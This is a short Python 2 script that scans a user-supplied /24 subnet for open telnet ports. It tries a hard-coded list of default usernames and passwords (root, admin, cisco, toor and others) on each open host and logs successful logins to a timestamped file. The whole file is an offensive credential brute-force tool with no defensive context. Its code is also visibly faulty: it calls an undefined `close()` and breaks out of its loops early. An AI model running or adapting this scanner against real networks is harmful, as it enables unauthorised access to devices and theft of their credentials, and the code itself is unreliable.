import socket
import sys, os, telnetlib
import time
 
Passwordlist = ['play','Telnet','admin','Admin','root']
userlist = ['play','Telnet','telnet','root','Root','admin','Admin','','cisco','Cisco','toor']
ips = raw_input("which ip would you like to start with? please type as follow - 192.168.1\n")
now = time.localtime()
file_name = "%s-%s-%s_%s;-%s.txt" % (now.tm_year, now.tm_mon, now.tm_mday, now.tm_hour, now.tm_min)
f = open ( file_name, 'w')
succ = 0
for hosts in range(256):
        try:
            host = ips + "." + str(hosts)
            print "[+] Connecting to " + host + ":" + str(23)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            result = s.connect_ex((host, 23))
            
            if result == 0:
                print "  [*] 23 "  + " open!"
                #  trying passwords:
                for user in userlist:
                    for password in Passwordlist:
                        #print 'trying user and password ' + "\n" + user + password
                        try:
                            tn = telnetlib.Telnet(host)
                            str2 = 'Last login'
                            tn.read_until("login: ")
                            tn.write(user + "\n")
                            tn.read_until("Password: ")
                            tn.write(password +"\n")
                            pri = tn.read_until("Last login:", 2 )
                           
                            inter = pri.find(str2)
                            # testing connection
                            if float(inter) > 0:
                                file_result = open(file_name, 'a')
                                file_result = f.write("****************************************\n")
                                file_result = f.write("Connection was seccsesful with  " + host + "\n")
                                file_result = f.write("\n password = " + password+ "\n")
                                file_result = f.write("\n user = " + user + "\n")
                                file_result = f.write ("****************************************\n")
                                succ = succ + 1
                                
                                file_result = close()
                            else :
                                print 'the wrong password ' + password
                        except:
                            print '\n'
                        break
                    break
        except:
            print '\n'
            
